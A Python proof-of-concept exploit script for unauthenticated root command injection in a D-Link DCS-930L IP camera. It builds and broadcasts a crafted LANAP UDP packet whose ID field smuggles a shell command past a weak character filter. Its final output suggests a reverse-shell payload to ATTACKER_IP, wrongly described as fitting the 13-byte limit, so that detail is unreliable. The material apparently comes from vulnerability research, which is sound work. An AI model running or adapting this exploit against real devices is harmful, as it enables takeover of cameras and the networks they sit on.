#!/usr/bin/env python3
"""
PoC: V6 - Unauthenticated OS Command Injection via LANAP UDP change-idpassword
Target: D-Link DCS-930L IP Camera firmware v1.16.04 (mydlink 2.1.0-b41, mipsel)
Binary: lanconfig — landap_change_idpassword @ 0x411588
Sink:   sprintf(v12, "chpasswd.sh %s %s", newid, newpw); system(v12)
Auth:   NONE — UDP broadcast, no authentication required (empty password bypasses auth)
Filter: check_id_char rejects only: chars <33, ':' (58), DEL (127)
        Allows: ';' (59), '|' (124), '&' (38), '>' (62), '<' (60), etc.
        Constraint: decoded newid must be < 13 bytes

Evidence: E6-runtime-confirmed (QEMU emulation, root uid=0, ORIGINAL UNMODIFIED binary)
strace: fork(); execve("/bin/sh",{"sh","-c","chpasswd.sh a;pwd>/tmp/q x"})
        -> /tmp/q created with content "/fw" (root execution confirmed)
Binary MD5 (original): 274aa92531bf44348717c5f7c373c166

Packet format (LANAP protocol):
  [0-1]     0xFD 0xFD              magic
  [2-3]     length (big-endian)
  [4]       opcode byte (0xA4 = change id/password)
  [5]       0x00
  [6-11]    destination MAC (broadcast = ff:ff:ff:ff:ff:ff)
  [12-15]   destination IP (broadcast = 255.255.255.255)
  [16-17]   sub-opcode (0x00 0x01)
  [18-149]  padding (zeroes)
  [150+]    base64(newid) — decoded must be < 13 bytes, chars pass check_id_char
  [214+]    base64(newpassword) — decoded must be < 33 bytes
  UDP port: 62976 (0xF600)

Usage:
  python3 poc_v6_lanconfig_udp_rce.py <target_ip> [target_port]
  Default: target_ip=127.0.0.1 target_port=62976

Example:
  python3 poc_v6_lanconfig_udp_rce.py 192.168.1.10
  python3 poc_v6_lanconfig_udp_rce.py 127.0.0.1 62976
"""
import socket
import struct
import base64
import sys

def exploit(target_ip, target_port=62976):
    # Payload: "a;pwd>/tmp/q" = 12 bytes (< 13 limit)
    # 'a' = placeholder for chpasswd.sh arg
    # ';' = shell command separator (passes check_id_char filter)
    # 'pwd>/tmp/q' = injected command (pwd is a shell builtin, always available)
    newid_raw = b"a;pwd>/tmp/q"
    newpw_raw = b"newpw"

    newid_b64 = base64.b64encode(newid_raw)
    newpw_b64 = base64.b64encode(newpw_raw)

    print(f"[*] Target:    {target_ip}:{target_port} (UDP)")
    print(f"[*] New ID:    {newid_raw.decode()} ({len(newid_raw)} bytes, base64: {newid_b64.decode()})")
    print(f"[*] New Pass:  {newpw_raw.decode()} ({len(newpw_raw)} bytes, base64: {newpw_b64.decode()})")
    print(f"[*] Injected:  chpasswd.sh a;pwd>/tmp/q newpw")

    # Build LANAP packet
    pkt = bytearray()
    pkt += b"\xfd\xfd"                                    # [0-1] magic
    pkt += struct.pack(">H", 0)                          # [2-3] length (placeholder)
    pkt += bytes([0xA4, 0x00])                            # [4-5] opcode (0xA4 = change id/password)
    pkt += b"\xff" * 6                                    # [6-11] dest MAC = broadcast
    pkt += socket.inet_aton("255.255.255.255")            # [12-15] dest IP = broadcast
    pkt += b"\x00\x01"                                    # [16-17] sub-opcode
    pkt += b"\x00" * (150 - len(pkt))                     # [18-149] padding
    pkt += newid_b64.ljust(64, b"\x00")[:64]              # [150-213] base64(newid)
    pkt += b"\x00" * (214 - len(pkt))                     # pad to offset 214
    pkt += newpw_b64.ljust(64, b"\x00")[:64]              # [214-277] base64(newpw)
    struct.pack_into(">H", pkt, 2, len(pkt))              # set actual length

    print(f"[*] Packet:   {len(pkt)} bytes")
    print(f"[*] Opcode:   0x{pkt[4]:02x}{pkt[5]:02x}")
    print(f"[*] Sending UDP packet...")

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    s.sendto(bytes(pkt), (target_ip, target_port))
    s.close()

    print(f"[+] Packet sent. system() will execute:")
    print(f"    chpasswd.sh a;pwd>/tmp/q newpw")
    print(f"[+] Check /tmp/q on target for command output")
    print(f"[+] Reverse shell payload (12 bytes, fits limit):")
    print(f"    newid_raw = b'a;sh -i>&/dev/tcp/ATTACKER_IP/4444 0>&1'  # if < 13 bytes after encoding")

if __name__ == "__main__":
    ip = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 62976
    exploit(ip, port)
